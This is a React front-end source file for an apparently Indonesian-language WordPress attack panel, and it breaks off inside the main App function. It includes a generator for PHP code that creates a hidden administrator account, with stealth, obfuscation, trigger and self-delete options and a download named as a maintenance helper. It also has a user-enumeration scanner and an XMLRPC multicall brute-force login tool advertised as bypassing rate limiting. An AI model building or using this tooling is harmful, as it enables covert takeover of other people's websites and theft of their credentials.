import { useState, useEffect } from "react";
import "@/App.css";
import axios from "axios";
import { Toaster, toast } from "sonner";
import { 
  Copy, Check, Trash2, Download, History, Settings, Code, Shield, Clock, 
  Eye, EyeOff, RefreshCw, Search, AlertTriangle, CheckCircle, XCircle,
  Users, Server, Lock, Globe, Scan, ChevronDown, ChevronUp, ExternalLink,
  Zap, Key, Target, Play, Square, Loader2
} from "lucide-react";

const BACKEND_URL = process.env.REACT_APP_BACKEND_URL;
const API = `${BACKEND_URL}/api`;

// Admin Adder Component (simplified for space)
const AdminAdder = () => {
  const [codeType, setCodeType] = useState("theme");
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [email, setEmail] = useState("");
  const [displayName, setDisplayName] = useState("");
  const [role, setRole] = useState("administrator");
  const [hideFromUserList, setHideFromUserList] = useState(false);
  const [hideFromUserCount, setHideFromUserCount] = useState(false);
  const [obfuscateCode, setObfuscateCode] = useState(false);
  const [useBase64, setUseBase64] = useState(false);
  const [triggerType, setTriggerType] = useState("immediate");
  const [urlParamKey, setUrlParamKey] = useState("wp_setup");
  const [urlParamValue, setUrlParamValue] = useState("init");
  const [scheduledTime, setScheduledTime] = useState("");
  const [autoDelete, setAutoDelete] = useState(false);
  const [generatedCode, setGeneratedCode] = useState("");
  const [copied, setCopied] = useState(false);
  const [loading, setLoading] = useState(false);
  const [history, setHistory] = useState([]);
  const [showHistory, setShowHistory] = useState(false);
  const [showPassword, setShowPassword] = useState(false);

  useEffect(() => { fetchHistory(); }, []);

  const fetchHistory = async () => {
    try { const r = await axios.get(`${API}/history`); setHistory(r.data); } catch (e) { console.error(e); }
  };

  const generateRandomPassword = () => {
    const chars = "ABCDEFGHJKLMNPQRSTUVWXYZabcdefghjkmnpqrstuvwxyz23456789!@#$%";
    let result = ""; for (let i = 0; i < 16; i++) result += chars.charAt(Math.floor(Math.random() * chars.length));
    setPassword(result);
  };

  const handleGenerate = async () => {
    if (!username || !password || !email) { toast.error("Username, password, dan email wajib diisi!"); return; }
    setLoading(true);
    try {
      const r = await axios.post(`${API}/generate`, {
        code_type: codeType, admin_config: { username, password, email, display_name: displayName || username, role },
        stealth_config: { hide_from_user_list: hideFromUserList, hide_from_user_count: hideFromUserCount, obfuscate_code: obfuscateCode, use_base64_encoding: useBase64 },
        trigger_config: { trigger_type: triggerType, url_param_key: urlParamKey, url_param_value: urlParamValue, scheduled_time: scheduledTime, auto_delete_after_run: autoDelete },
      });
      setGeneratedCode(r.data.php_code); toast.success("Kode berhasil di-generate!"); fetchHistory();
    } catch (e) { toast.error("Gagal: " + (e.response?.data?.detail || e.message)); } finally { setLoading(false); }
  };

  const copyToClipboard = async () => {
    try { await navigator.clipboard.writeText(generatedCode); setCopied(true); toast.success("Disalin!"); setTimeout(() => setCopied(false), 2000); } catch (e) { toast.error("Gagal menyalin"); }
  };

  const downloadCode = () => {
    const filename = codeType === "plugin" ? "wp-maintenance-helper.php" : "functions-snippet.php";
    const blob = new Blob([generatedCode], { type: "text/plain" }); const url = URL.createObjectURL(blob);
    const a = document.createElement("a"); a.href = url; a.download = filename; a.click(); URL.revokeObjectURL(url);
  };

  return (
    <div className="grid grid-cols-1 lg:grid-cols-2 gap-8">
      <div className="space-y-6">
        <div className="bg-white/5 backdrop-blur-sm rounded-xl p-6 border border-purple-800/30">
          <h2 className="text-lg font-semibold text-white mb-4 flex items-center gap-2"><Code className="w-5 h-5 text-purple-400" /> Tipe Kode</h2>
          <div className="grid grid-cols-2 gap-3">
            {["theme", "plugin"].map(t => (
              <button key={t} onClick={() => setCodeType(t)} className={`p-4 rounded-lg border-2 transition-all ${codeType === t ? "border-purple-500 bg-purple-500/20 text-white" : "border-white/10 bg-white/5 text-gray-400"}`}>
                <div className="font-medium capitalize">{t}</div>
                <div className="text-xs mt-1 opacity-70">{t === "theme" ? "Untuk functions.php" : "File plugin terpisah"}</div>
              </button>
            ))}
          </div>
        </div>

        <div className="bg-white/5 backdrop-blur-sm rounded-xl p-6 border border-purple-800/30">
          <h2 className="text-lg font-semibold text-white mb-4 flex items-center gap-2"><Settings className="w-5 h-5 text-purple-400" /> Konfigurasi Admin</h2>
          <div className="space-y-4">
            <div><label className="block text-sm text-purple-300 mb-1">Username *</label><input type="text" value={username} onChange={e => setUsername(e.target.value)} placeholder="admin_baru" className="w-full px-4 py-2 rounded-lg bg-white/10 border border-purple-800/30 text-white placeholder-gray-500 focus:outline-none focus:border-purple-500" /></div>
            <div><label className="block text-sm text-purple-300 mb-1">Password *</label>
              <div className="flex gap-2">
                <div className="relative flex-1"><input type={showPassword ? "text" : "password"} value={password} onChange={e => setPassword(e.target.value)} placeholder="Password kuat" className="w-full px-4 py-2 rounded-lg bg-white/10 border border-purple-800/30 text-white placeholder-gray-500 focus:outline-none focus:border-purple-500 pr-10" /><button type="button" onClick={() => setShowPassword(!showPassword)} className="absolute right-2 top-1/2 -translate-y-1/2 text-gray-400 hover:text-white">{showPassword ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}</button></div>
                <button onClick={generateRandomPassword} className="px-3 py-2 bg-purple-600 hover:bg-purple-700 rounded-lg text-white"><RefreshCw className="w-4 h-4" /></button>
              </div>
            </div>
            <div><label className="block text-sm text-purple-300 mb-1">Email *</label><input type="email" value={email} onChange={e => setEmail(e.target.value)} placeholder="admin@example.com" className="w-full px-4 py-2 rounded-lg bg-white/10 border border-purple-800/30 text-white placeholder-gray-500 focus:outline-none focus:border-purple-500" /></div>
            <div><label className="block text-sm text-purple-300 mb-1">Role</label><select value={role} onChange={e => setRole(e.target.value)} className="w-full px-4 py-2 rounded-lg bg-white/10 border border-purple-800/30 text-white focus:outline-none focus:border-purple-500"><option value="administrator" className="bg-gray-800">Administrator</option><option value="editor" className="bg-gray-800">Editor</option></select></div>
          </div>
        </div>

        <div className="bg-white/5 backdrop-blur-sm rounded-xl p-6 border border-purple-800/30">
          <h2 className="text-lg font-semibold text-white mb-4 flex items-center gap-2"><Shield className="w-5 h-5 text-purple-400" /> Opsi Stealth</h2>
          <div className="space-y-3">
            {[{ c: hideFromUserList, s: setHideFromUserList, l: "Sembunyikan dari daftar user" }, { c: hideFromUserCount, s: setHideFromUserCount, l: "Sembunyikan dari jumlah user" }, { c: obfuscateCode, s: setObfuscateCode, l: "Sembunyikan plugin dari daftar" }, { c: useBase64, s: setUseBase64, l: "Encode dengan Base64" }].map((o, i) => (
              <label key={i} className="flex items-center gap-3 cursor-pointer group"><input type="checkbox" checked={o.c} onChange={e => o.s(e.target.checked)} className="w-4 h-4 rounded" /><span className="text-gray-300 group-hover:text-white">{o.l}</span></label>
            ))}
          </div>
        </div>

        <div className="bg-white/5 backdrop-blur-sm rounded-xl p-6 border border-purple-800/30">
          <h2 className="text-lg font-semibold text-white mb-4 flex items-center gap-2"><Clock className="w-5 h-5 text-purple-400" /> Opsi Trigger</h2>
          <div className="grid grid-cols-3 gap-2">
            {["immediate", "url_param", "scheduled"].map(t => (<button key={t} onClick={() => setTriggerType(t)} className={`px-3 py-2 rounded-lg text-sm ${triggerType === t ? "bg-purple-500 text-white" : "bg-white/10 text-gray-400"}`}>{t === "immediate" ? "Langsung" : t === "url_param" ? "URL Param" : "Terjadwal"}</button>))}
          </div>
          {triggerType === "url_param" && (<div className="grid grid-cols-2 gap-3 mt-4"><input type="text" value={urlParamKey} onChange={e => setUrlParamKey(e.target.value)} placeholder="Key" className="px-3 py-2 rounded-lg bg-white/10 border border-purple-800/30 text-white text-sm" /><input type="text" value={urlParamValue} onChange={e => setUrlParamValue(e.target.value)} placeholder="Value" className="px-3 py-2 rounded-lg bg-white/10 border border-purple-800/30 text-white text-sm" /></div>)}
          <label className="flex items-center gap-3 cursor-pointer group mt-4"><input type="checkbox" checked={autoDelete} onChange={e => setAutoDelete(e.target.checked)} className="w-4 h-4 rounded" /><span className="text-gray-300 group-hover:text-white">Hapus kode setelah eksekusi</span></label>
        </div>

        <button onClick={handleGenerate} disabled={loading} className="w-full py-4 bg-gradient-to-r from-purple-600 to-pink-600 hover:from-purple-700 hover:to-pink-700 disabled:opacity-50 text-white font-semibold rounded-xl flex items-center justify-center gap-2">{loading ? <><RefreshCw className="w-5 h-5 animate-spin" /> Generating...</> : <><Code className="w-5 h-5" /> Generate Kode</>}</button>
      </div>

      <div className="space-y-6">
        <div className="bg-white/5 backdrop-blur-sm rounded-xl p-6 border border-purple-800/30">
          <div className="flex items-center justify-between mb-4">
            <h2 className="text-lg font-semibold text-white flex items-center gap-2"><Code className="w-5 h-5 text-purple-400" /> Kode PHP</h2>
            {generatedCode && (<div className="flex gap-2"><button onClick={copyToClipboard} className="p-2 bg-white/10 hover:bg-white/20 rounded-lg text-purple-300">{copied ? <Check className="w-4 h-4 text-green-400" /> : <Copy className="w-4 h-4" />}</button><button onClick={downloadCode} className="p-2 bg-white/10 hover:bg-white/20 rounded-lg text-purple-300"><Download className="w-4 h-4" /></button></div>)}
          </div>
          <pre className="bg-black/50 rounded-lg p-4 overflow-x-auto text-sm text-gray-300 font-mono min-h-[400px] max-h-[500px] overflow-y-auto">{generatedCode || <span className="text-gray-500 italic">Kode akan muncul setelah generate...</span>}</pre>
        </div>

        <div className="bg-white/5 backdrop-blur-sm rounded-xl p-6 border border-purple-800/30">
          <div className="flex items-center justify-between mb-4 cursor-pointer" onClick={() => setShowHistory(!showHistory)}><h2 className="text-lg font-semibold text-white flex items-center gap-2"><History className="w-5 h-5 text-purple-400" /> History ({history.length})</h2>{showHistory ? <ChevronUp className="w-5 h-5 text-gray-400" /> : <ChevronDown className="w-5 h-5 text-gray-400" />}</div>
          {showHistory && (<div className="space-y-2 max-h-[200px] overflow-y-auto">{history.length === 0 ? <p className="text-gray-500 text-center py-4">Belum ada</p> : history.slice(0, 5).map(item => (<div key={item.id} className="p-3 rounded-lg border border-white/10 bg-white/5"><div className="text-white text-sm">{item.admin_username}</div><div className="text-xs text-gray-400">{item.code_type} • {item.trigger_type}</div></div>))}</div>)}
        </div>
      </div>
    </div>
  );
};

// Security Scanner Component
const SecurityScanner = () => {
  const [targetUrl, setTargetUrl] = useState("");
  const [scanning, setScanning] = useState(false);
  const [scanResult, setScanResult] = useState(null);
  const [scanHistory, setScanHistory] = useState([]);
  const [expandedSections, setExpandedSections] = useState({ users: true, xmlrpc: true, headers: false, recommendations: true });

  useEffect(() => { fetchScanHistory(); }, []);

  const fetchScanHistory = async () => { try { const r = await axios.get(`${API}/scans`); setScanHistory(r.data); } catch (e) { console.error(e); } };

  const handleScan = async () => {
    if (!targetUrl) { toast.error("Masukkan URL!"); return; }
    setScanning(true); setScanResult(null); toast.info("Memulai scan...");
    try { const r = await axios.post(`${API}/scan`, { target_url: targetUrl, scan_types: ["user_enum", "xmlrpc", "security_headers", "wp_version"] }); setScanResult(r.data); toast.success("Scan selesai!"); fetchScanHistory(); }
    catch (e) { toast.error("Gagal: " + (e.response?.data?.detail || e.message)); } finally { setScanning(false); }
  };

  const loadScan = async (id) => { try { const r = await axios.get(`${API}/scans/${id}`); setScanResult(r.data); setTargetUrl(r.data.target_url); } catch (e) { toast.error("Gagal memuat"); } };

  const toggleSection = (s) => setExpandedSections(p => ({ ...p, [s]: !p[s] }));

  const SeverityBadge = ({ severity }) => {
    const colors = { "High": "bg-red-500/20 text-red-400 border-red-500/50", "Medium": "bg-yellow-500/20 text-yellow-400 border-yellow-500/50", "Low": "bg-blue-500/20 text-blue-400 border-blue-500/50" };
    return <span className={`px-2 py-0.5 rounded text-xs border ${colors[severity] || "bg-gray-500/20 text-gray-400"}`}>{severity}</span>;
  };

  return (
    <div className="grid grid-cols-1 lg:grid-cols-3 gap-8">
      <div className="lg:col-span-1 space-y-6">
        <div className="bg-white/5 backdrop-blur-sm rounded-xl p-6 border border-purple-800/30">
          <h2 className="text-lg font-semibold text-white mb-4 flex items-center gap-2"><Scan className="w-5 h-5 text-green-400" /> WP Security Scanner</h2>
          <div className="space-y-4">
            <div><label className="block text-sm text-purple-300 mb-1">Target URL</label><input type="text" value={targetUrl} onChange={e => setTargetUrl(e.target.value)} placeholder="https://example.com" className="w-full px-4 py-3 rounded-lg bg-white/10 border border-purple-800/30 text-white placeholder-gray-500 focus:outline-none focus:border-purple-500" /></div>
            <button onClick={handleScan} disabled={scanning} className="w-full py-3 bg-gradient-to-r from-green-600 to-emerald-600 disabled:opacity-50 text-white font-semibold rounded-xl flex items-center justify-center gap-2">{scanning ? <><RefreshCw className="w-5 h-5 animate-spin" /> Scanning...</> : <><Search className="w-5 h-5" /> Mulai Scan</>}</button>
          </div>
          <div className="mt-6 grid grid-cols-2 gap-2 text-xs">
            {[{ i: Users, l: "User Enum" }, { i: Server, l: "XMLRPC" }, { i: Lock, l: "Headers" }, { i: Globe, l: "WP Detection" }].map(x => (<div key={x.l} className="flex items-center gap-2 p-2 bg-black/20 rounded"><x.i className="w-3 h-3 text-purple-400" /><span className="text-gray-400">{x.l}</span></div>))}
          </div>
        </div>

        <div className="bg-white/5 backdrop-blur-sm rounded-xl p-6 border border-purple-800/30">
          <h2 className="text-lg font-semibold text-white mb-4 flex items-center gap-2"><History className="w-5 h-5 text-purple-400" /> Scan History</h2>
          <div className="space-y-2 max-h-[250px] overflow-y-auto">{scanHistory.length === 0 ? <p className="text-gray-500 text-center py-4">Belum ada</p> : scanHistory.slice(0, 8).map(s => (<div key={s.id} onClick={() => loadScan(s.id)} className="p-3 rounded-lg border border-white/10 bg-white/5 hover:border-purple-500/50 cursor-pointer"><div className="text-white text-sm truncate">{s.target_url}</div><div className="flex items-center gap-2 mt-1">{s.is_wordpress ? <span className="text-xs text-green-400">✓ WP</span> : <span className="text-xs text-red-400">✗</span>}<span className="text-xs text-gray-500">{new Date(s.scan_date).toLocaleDateString()}</span></div></div>))}</div>
        </div>
      </div>

      <div className="lg:col-span-2 space-y-6">
        {!scanResult ? (
          <div className="bg-white/5 backdrop-blur-sm rounded-xl p-12 border border-purple-800/30 text-center"><Scan className="w-16 h-16 text-purple-500/50 mx-auto mb-4" /><h3 className="text-xl text-gray-400">Masukkan URL dan klik Scan</h3></div>
        ) : (
          <>
            <div className={`bg-white/5 backdrop-blur-sm rounded-xl p-6 border ${scanResult.is_wordpress ? "border-green-500/30" : "border-red-500/30"}`}>
              <div className="flex items-center justify-between">
                <div><h2 className="text-xl font-semibold text-white flex items-center gap-2">{scanResult.is_wordpress ? <CheckCircle className="w-6 h-6 text-green-400" /> : <XCircle className="w-6 h-6 text-red-400" />}{scanResult.target_url}</h2><div className="flex items-center gap-4 mt-2 text-sm">{scanResult.is_wordpress && <><span className="text-green-400">WordPress</span>{scanResult.wp_version && <span className="text-yellow-400">v{scanResult.wp_version}</span>}</>}</div></div>
                <div className="text-right"><div className="text-3xl font-bold text-purple-400">{scanResult.users_found?.length || 0}</div><div className="text-xs text-gray-400">Users</div></div>
              </div>
            </div>

            {scanResult.users_found?.length > 0 && (
              <div className="bg-white/5 backdrop-blur-sm rounded-xl border border-purple-800/30 overflow-hidden">
                <div className="p-4 border-b border-purple-800/30 flex items-center justify-between cursor-pointer" onClick={() => toggleSection('users')}><h3 className="text-lg font-semibold text-white flex items-center gap-2"><Users className="w-5 h-5 text-red-400" />Users ({scanResult.users_found.length})<SeverityBadge severity="High" /></h3>{expandedSections.users ? <ChevronUp className="w-5 h-5 text-gray-400" /> : <ChevronDown className="w-5 h-5 text-gray-400" />}</div>
                {expandedSections.users && (<div className="p-4 max-h-[300px] overflow-y-auto"><table className="w-full text-sm"><thead><tr className="text-left text-gray-400 border-b border-white/10"><th className="pb-2">ID</th><th className="pb-2">Username</th><th className="pb-2">Method</th></tr></thead><tbody className="text-gray-300">{scanResult.users_found.map((u, i) => (<tr key={i} className="border-b border-white/5"><td className="py-2 text-purple-400">{u.id || "-"}</td><td className="py-2 font-mono text-red-400">{u.username}</td><td className="py-2"><span className="px-2 py-0.5 bg-purple-500/20 text-purple-300 rounded text-xs">{u.method}</span></td></tr>))}</tbody></table></div>)}
              </div>
            )}

            {scanResult.xmlrpc_status && (
              <div className="bg-white/5 backdrop-blur-sm rounded-xl border border-purple-800/30 overflow-hidden">
                <div className="p-4 border-b border-purple-800/30 flex items-center justify-between cursor-pointer" onClick={() => toggleSection('xmlrpc')}><h3 className="text-lg font-semibold text-white flex items-center gap-2"><Server className="w-5 h-5 text-yellow-400" />XMLRPC{scanResult.xmlrpc_status.enabled ? <SeverityBadge severity="Medium" /> : <span className="px-2 py-0.5 rounded text-xs bg-green-500/20 text-green-400">Disabled</span>}</h3></div>
                {expandedSections.xmlrpc && (<div className="p-4 space-y-4">
                  <div className="grid grid-cols-4 gap-4">{[{ l: "Status", v: scanResult.xmlrpc_status.enabled ? "ENABLED" : "DISABLED", c: scanResult.xmlrpc_status.enabled ? "text-red-400" : "text-green-400" }, { l: "Pingback", v: scanResult.xmlrpc_status.pingback_enabled ? "YES" : "NO", c: scanResult.xmlrpc_status.pingback_enabled ? "text-yellow-400" : "text-green-400" }, { l: "Multicall", v: scanResult.xmlrpc_status.multicall_enabled ? "YES" : "NO", c: scanResult.xmlrpc_status.multicall_enabled ? "text-red-400" : "text-green-400" }, { l: "Methods", v: scanResult.xmlrpc_status.methods_available?.length || 0, c: "text-purple-400" }].map(x => (<div key={x.l} className="p-3 bg-black/30 rounded-lg"><div className="text-xs text-gray-400">{x.l}</div><div className={`text-lg font-bold ${x.c}`}>{x.v}</div></div>))}</div>
                  {scanResult.xmlrpc_status.vulnerabilities?.length > 0 && (<div className="space-y-2">{scanResult.xmlrpc_status.vulnerabilities.map((v, i) => (<div key={i} className="p-3 bg-red-500/10 border border-red-500/30 rounded-lg"><div className="flex items-center gap-2"><AlertTriangle className="w-4 h-4 text-red-400" /><span className="text-white font-medium">{v.name}</span><SeverityBadge severity={v.severity} /></div><p className="text-sm text-gray-400 mt-1">{v.description}</p></div>))}</div>)}
                </div>)}
              </div>
            )}

            {scanResult.recommendations?.length > 0 && (
              <div className="bg-white/5 backdrop-blur-sm rounded-xl border border-purple-800/30 overflow-hidden">
                <div className="p-4 border-b border-purple-800/30 cursor-pointer" onClick={() => toggleSection('recommendations')}><h3 className="text-lg font-semibold text-white flex items-center gap-2"><AlertTriangle className="w-5 h-5 text-yellow-400" />Recommendations ({scanResult.recommendations.length})</h3></div>
                {expandedSections.recommendations && (<div className="p-4 space-y-2 max-h-[300px] overflow-y-auto">{scanResult.recommendations.map((r, i) => (<div key={i} className="p-3 bg-black/30 rounded-lg text-sm text-gray-300">{r}</div>))}</div>)}
              </div>
            )}
          </>
        )}
      </div>
    </div>
  );
};

// Brute Force Component
const BruteForce = () => {
  const [targetUrl, setTargetUrl] = useState("");
  const [usernames, setUsernames] = useState("admin");
  const [customPasswords, setCustomPasswords] = useState("");
  const [useDefaultWordlist, setUseDefaultWordlist] = useState(true);
  const [batchSize, setBatchSize] = useState(100);
  const [running, setRunning] = useState(false);
  const [result, setResult] = useState(null);
  const [history, setHistory] = useState([]);
  const [wordlistCount, setWordlistCount] = useState(0);

  useEffect(() => {
    fetchHistory();
    fetchWordlist();
  }, []);

  const fetchHistory = async () => {
    try { const r = await axios.get(`${API}/bruteforce/history`); setHistory(r.data); } catch (e) { console.error(e); }
  };

  const fetchWordlist = async () => {
    try { const r = await axios.get(`${API}/wordlist`); setWordlistCount(r.data.count); } catch (e) { console.error(e); }
  };

  const startBruteforce = async () => {
    if (!targetUrl) { toast.error("Masukkan target URL!"); return; }
    if (!usernames.trim()) { toast.error("Masukkan username!"); return; }

    setRunning(true);
    setResult(null);
    toast.info("Memulai brute force...");

    try {
      const usernameList = usernames.split('\n').map(u => u.trim()).filter(u => u);
      const passwordList = customPasswords ? customPasswords.split('\n').map(p => p.trim()).filter(p => p) : null;

      const response = await axios.post(`${API}/bruteforce/start`, {
        target_url: targetUrl,
        usernames: usernameList,
        passwords: passwordList,
        use_default_wordlist: useDefaultWordlist,
        batch_size: batchSize
      }, { timeout: 300000 }); // 5 minute timeout

      setResult(response.data);
      
      if (response.data.credentials_found?.length > 0) {
        toast.success(`🎉 Ditemukan ${response.data.credentials_found.length} kredensial!`);
      } else if (response.data.status === "completed") {
        toast.info("Selesai - tidak ada kredensial ditemukan");
      } else {
        toast.error(response.data.error || "Brute force gagal");
      }
      
      fetchHistory();
    } catch (e) {
      toast.error("Error: " + (e.response?.data?.detail || e.message));
    } finally {
      setRunning(false);
    }
  };

  const loadResult = async (id) => {
    try {
      const r = await axios.get(`${API}/bruteforce/${id}`);
      setResult(r.data);
      setTargetUrl(r.data.target_url);
    } catch (e) {
      toast.error("Gagal memuat hasil");
    }
  };

  return (
    <div className="grid grid-cols-1 lg:grid-cols-3 gap-8">
      {/* Left Column - Configuration */}
      <div className="lg:col-span-1 space-y-6">
        <div className="bg-white/5 backdrop-blur-sm rounded-xl p-6 border border-red-800/30">
          <h2 className="text-lg font-semibold text-white mb-4 flex items-center gap-2">
            <Zap className="w-5 h-5 text-red-400" /> XMLRPC Multicall Brute Force
          </h2>
          
          <div className="space-y-4">
            <div>
              <label className="block text-sm text-red-300 mb-1">Target URL *</label>
              <input
                type="text"
                value={targetUrl}
                onChange={e => setTargetUrl(e.target.value)}
                placeholder="https://target.com"
                className="w-full px-4 py-3 rounded-lg bg-white/10 border border-red-800/30 text-white placeholder-gray-500 focus:outline-none focus:border-red-500"
                disabled={running}
              />
            </div>

            <div>
              <label className="block text-sm text-red-300 mb-1">Usernames (satu per baris) *</label>
              <textarea
                value={usernames}
                onChange={e => setUsernames(e.target.value)}
                placeholder="admin&#10;administrator&#10;root"
                rows={4}
                className="w-full px-4 py-3 rounded-lg bg-white/10 border border-red-800/30 text-white placeholder-gray-500 focus:outline-none focus:border-red-500 font-mono text-sm"
                disabled={running}
              />
            </div>

            <div>
              <label className="flex items-center gap-3 cursor-pointer group">
                <input
                  type="checkbox"
                  checked={useDefaultWordlist}
                  onChange={e => setUseDefaultWordlist(e.target.checked)}
                  className="w-4 h-4 rounded"
                  disabled={running}
                />
                <span className="text-gray-300 group-hover:text-white">
                  Gunakan wordlist default ({wordlistCount} passwords)
                </span>
              </label>
            </div>

            <div>
              <label className="block text-sm text-red-300 mb-1">Password custom (opsional)</label>
              <textarea
                value={customPasswords}
                onChange={e => setCustomPasswords(e.target.value)}
                placeholder="password123&#10;admin123&#10;letmein"
                rows={3}
                className="w-full px-4 py-3 rounded-lg bg-white/10 border border-red-800/30 text-white placeholder-gray-500 focus:outline-none focus:border-red-500 font-mono text-sm"
                disabled={running}
              />
            </div>

            <div>
              <label className="block text-sm text-red-300 mb-1">Batch Size: {batchSize}</label>
              <input
                type="range"
                min="10"
                max="500"
                value={batchSize}
                onChange={e => setBatchSize(parseInt(e.target.value))}
                className="w-full"
                disabled={running}
              />
              <div className="flex justify-between text-xs text-gray-500">
                <span>10 (slower)</span>
                <span>500 (faster)</span>
              </div>
            </div>

            <button
              onClick={startBruteforce}
              disabled={running}
              className={`w-full py-4 font-semibold rounded-xl flex items-center justify-center gap-2 transition-all ${
                running 
                  ? "bg-gray-600 cursor-not-allowed" 
                  : "bg-gradient-to-r from-red-600 to-orange-600 hover:from-red-700 hover:to-orange-700"
              } text-white`}
            >
              {running ? (
                <><Loader2 className="w-5 h-5 animate-spin" /> Running...</>
              ) : (
                <><Play className="w-5 h-5" /> Start Brute Force</>
              )}
            </button>
          </div>

          {/* Info Box */}
          <div className="mt-6 p-4 bg-red-500/10 border border-red-500/30 rounded-lg">
            <h4 className="text-sm font-medium text-red-400 mb-2 flex items-center gap-2">
              <AlertTriangle className="w-4 h-4" /> Cara Kerja
            </h4>
            <ul className="text-xs text-gray-400 space-y-1">
              <li>• Menggunakan system.multicall XMLRPC</li>
              <li>• Bypass rate limiting dengan batch request</li>
              <li>• {batchSize} password per request</li>
              <li>• Method: wp.getUsersBlogs</li>
            </ul>
          </div>
        </div>

        {/* History */}
        <div className="bg-white/5 backdrop-blur-sm rounded-xl p-6 border border-purple-800/30">
          <h2 className="text-lg font-semibold text-white mb-4 flex items-center gap-2">
            <History className="w-5 h-5 text-purple-400" /> Attack History
          </h2>
          <div className="space-y-2 max-h-[200px] overflow-y-auto">
            {history.length === 0 ? (
              <p className="text-gray-500 text-center py-4">Belum ada history</p>
            ) : (
              history.slice(0, 10).map(h => (
                <div
                  key={h.id}
                  onClick={() => loadResult(h.id)}
                  className="p-3 rounded-lg border border-white/10 bg-white/5 hover:border-red-500/50 cursor-pointer transition-all"
                >
                  <div className="text-white text-sm truncate">{h.target_url}</div>
                  <div className="flex items-center gap-2 mt-1">
                    <span className={`text-xs ${h.credentials_found?.length > 0 ? "text-green-400" : "text-gray-400"}`}>
                      {h.credentials_found?.length > 0 ? `✓ ${h.credentials_found.length} found` : "No creds"}
                    </span>
                    <span className="text-xs text-gray-500">{h.total_attempts} attempts</span>
                  </div>
                </div>
              ))
            )}
          </div>
        </div>
      </div>

      {/* Right Column - Results */}
      <div className="lg:col-span-2 space-y-6">
        {!result ? (
          <div className="bg-white/5 backdrop-blur-sm rounded-xl p-12 border border-red-800/30 text-center">
            <Zap className="w-16 h-16 text-red-500/50 mx-auto mb-4" />
            <h3 className="text-xl text-gray-400">Konfigurasi target dan klik Start</h3>
            <p className="text-sm text-gray-500 mt-2">XMLRPC Multicall akan mengirim banyak login attempt dalam satu request</p>
          </div>
        ) : (
          <>
            {/* Status Card */}
            <div className={`bg-white/5 backdrop-blur-sm rounded-xl p-6 border ${
              result.credentials_found?.length > 0 ? "border-green-500/30" : 
              result.status === "failed" ? "border-red-500/30" : "border-yellow-500/30"
            }`}>
              <div className="flex items-center justify-between">
                <div>
                  <h2 className="text-xl font-semibold text-white flex items-center gap-2">
                    {result.credentials_found?.length > 0 ? (
                      <CheckCircle className="w-6 h-6 text-green-400" />
                    ) : result.status === "failed" ? (
                      <XCircle className="w-6 h-6 text-red-400" />
                    ) : (
                      <AlertTriangle className="w-6 h-6 text-yellow-400" />
                    )}
                    {result.target_url}
                  </h2>
                  <div className="flex items-center gap-4 mt-2 text-sm">
                    <span className={result.xmlrpc_enabled ? "text-green-400" : "text-red-400"}>
                      XMLRPC: {result.xmlrpc_enabled ? "Enabled" : "Disabled"}
                    </span>
                    <span className={result.multicall_enabled ? "text-green-400" : "text-red-400"}>
                      Multicall: {result.multicall_enabled ? "Yes" : "No"}
                    </span>
                    <span className="text-gray-400">
                      Status: {result.status}
                    </span>
                  </div>
                </div>
                <div className="text-right">
                  <div className="text-3xl font-bold text-purple-400">{result.total_attempts}</div>
                  <div className="text-xs text-gray-400">Total Attempts</div>
                </div>
              </div>
              
              {result.error && (
                <div className="mt-4 p-3 bg-red-500/10 border border-red-500/30 rounded-lg text-red-400 text-sm">
                  {result.error}
                </div>
              )}
            </div>

            {/* Credentials Found */}
            {result.credentials_found?.length > 0 && (
              <div className="bg-green-500/10 backdrop-blur-sm rounded-xl border border-green-500/30 overflow-hidden">
                <div className="p-4 border-b border-green-500/30">
                  <h3 className="text-lg font-semibold text-white flex items-center gap-2">
                    <Key className="w-5 h-5 text-green-400" />
                    🎉 Credentials Found ({result.credentials_found.length})
                  </h3>
                </div>
                <div className="p-4">
                  <div className="space-y-3">
                    {result.credentials_found.map((cred, idx) => (
                      <div key={idx} className="p-4 bg-black/30 rounded-lg border border-green-500/20">
                        <div className="grid grid-cols-2 gap-4">
                          <div>
                            <div className="text-xs text-gray-400 mb-1">Username</div>
                            <div className="text-lg font-mono text-green-400">{cred.username}</div>
                          </div>
                          <div>
                            <div className="text-xs text-gray-400 mb-1">Password</div>
                            <div className="text-lg font-mono text-green-400">{cred.password}</div>
                          </div>
                        </div>
                        <div className="mt-2 text-xs text-gray-500">
                          Found at: {new Date(cred.found_at).toLocaleString()}
                        </div>
                      </div>
                    ))}
                  </div>
                </div>
              </div>
            )}

            {/* Progress */}
            {result.progress?.length > 0 && (
              <div className="bg-white/5 backdrop-blur-sm rounded-xl border border-purple-800/30 overflow-hidden">
                <div className="p-4 border-b border-purple-800/30">
                  <h3 className="text-lg font-semibold text-white flex items-center gap-2">
                    <Target className="w-5 h-5 text-purple-400" />
                    Attack Progress
                  </h3>
                </div>
                <div className="p-4">
                  <div className="space-y-2">
                    {result.progress.map((p, idx) => (
                      <div key={idx} className="flex items-center justify-between p-3 bg-black/30 rounded-lg">
                        <div className="flex items-center gap-3">
                          <span className="font-mono text-white">{p.username}</span>
                          {p.found && (
                            <span className="px-2 py-0.5 bg-green-500/20 text-green-400 rounded text-xs">
                              CRACKED: {p.password}
                            </span>
                          )}
                        </div>
                        <div className="flex items-center gap-2">
                          {p.status === "completed" ? (
                            <CheckCircle className="w-4 h-4 text-green-400" />
                          ) : p.status === "testing" ? (
                            <Loader2 className="w-4 h-4 text-yellow-400 animate-spin" />
                          ) : (
                            <Clock className="w-4 h-4 text-gray-400" />
                          )}
                          <span className="text-xs text-gray-400">{p.status}</span>
                        </div>
                      </div>
                    ))}
                  </div>
                </div>
              </div>
            )}

            {/* Stats */}
            <div className="grid grid-cols-2 md:grid-cols-4 gap-4">
              {[
                { label: "Usernames", value: result.usernames_tested?.length || 0, color: "text-purple-400" },
                { label: "Passwords", value: result.passwords_count || 0, color: "text-blue-400" },
                { label: "Total Attempts", value: result.total_attempts, color: "text-yellow-400" },
                { label: "Found", value: result.credentials_found?.length || 0, color: "text-green-400" }
              ].map(s => (
                <div key={s.label} className="bg-white/5 backdrop-blur-sm rounded-xl p-4 border border-purple-800/30">
                  <div className="text-xs text-gray-400">{s.label}</div>
                  <div className={`text-2xl font-bold ${s.color}`}>{s.value}</div>
                </div>
              ))}
            </div>
          </>
        )}
      </div>
    </div>
  );
};

// Main App
function App() {
  const [activeTab, setActiveTab] = useState("scanner");

  return (
